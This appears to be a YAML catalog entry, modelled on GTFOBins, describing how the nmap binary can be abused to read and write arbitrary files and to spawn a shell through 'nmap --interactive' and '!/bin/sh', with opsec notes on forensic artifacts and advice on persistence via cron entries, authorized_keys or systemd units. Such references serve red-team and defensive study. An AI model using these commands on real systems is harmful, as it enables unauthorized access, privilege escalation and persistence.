---
name: nmap
capabilities:
- exec
- spawn
- read
- write
required_permissions:
  level: user
difficulty: medium
opsec:
  noise: medium
  artifacts:
  - ~/.bash_history
  - Process arguments visible in ps and auditd
  - File timestamps / inotify events on target paths
  notes: ''
persistence_potential: true
examples:
- id: file-read
  description: Read an arbitrary file.
  capabilities:
  - read
  command: nmap -iL /path/to/input-file
  notes: The file is actually parsed as a list of hosts/networks, lines are leaked through error messages.
- id: file-write
  description: Write content to an arbitrary file.
  capabilities:
  - write
  command: nmap -oG=/path/to/output-file DATA
  notes: The payload appears inside the regular nmap output.
- id: shell
  description: Spawn an interactive shell.
  capabilities:
  - spawn
  - exec
  command: |-
    nmap --interactive
    !/bin/sh
references:
- https://gtfobins.github.io/gtfobins/nmap/
tags: []
persistence_notes: Combine with write/exec primitives to drop cron entries, authorized_keys, or systemd units.
---
